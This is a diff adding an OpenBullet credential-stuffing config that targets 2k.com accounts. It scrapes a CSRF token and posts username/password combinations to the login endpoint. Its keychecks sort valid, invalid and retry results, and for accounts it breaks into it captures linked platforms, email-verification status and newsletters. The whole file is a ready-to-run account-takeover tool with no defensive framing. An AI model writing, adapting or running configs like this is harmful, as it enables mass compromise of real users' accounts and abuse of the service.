@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "2k.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-06T23:51:07.9147996-04:00",
+  "AdditionalInfo": "",
+  "Author": "LethalLuck",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.2k.com" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "content=\"" "\"" -> VAR "csrf" 
+
+REQUEST POST "https://accounts.2k.com/v2/login" 
+  CONTENT "email=<USER>&password=<PASS>&locale=en-US" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-CSRFToken: <csrf>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "accounts_2k" 
+  KEYCHAIN Failure OR 
+    KEY "\"code\": 40301" 
+    KEY "\"code\": 40303" 
+  KEYCHAIN Retry OR 
+    KEY "CSRF verification failed" 
+
+REQUEST GET "https://accounts.2k.com/v2/me" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-CSRFToken: <csrf>" 
+
+IF "<SOURCE>" CONTAINS "\"code\": 40390000"
+
+FUNCTION Constant "UPDATE PASSWORD" -> CAP "Password" 
+
+SET STATUS CUSTOM "EXPIRED"
+ELSE
+
+PARSE "<SOURCE>" JSON "isEmailVerified" -> CAP "Email Verified" 
+
+PARSE "<SOURCE>" JSON "linkedPlatforms" -> CAP "Platforms" 
+
+PARSE "<SOURCE>" JSON "subscribedNewsletters" -> CAP "Newsletters" 
+
+ENDIF
+
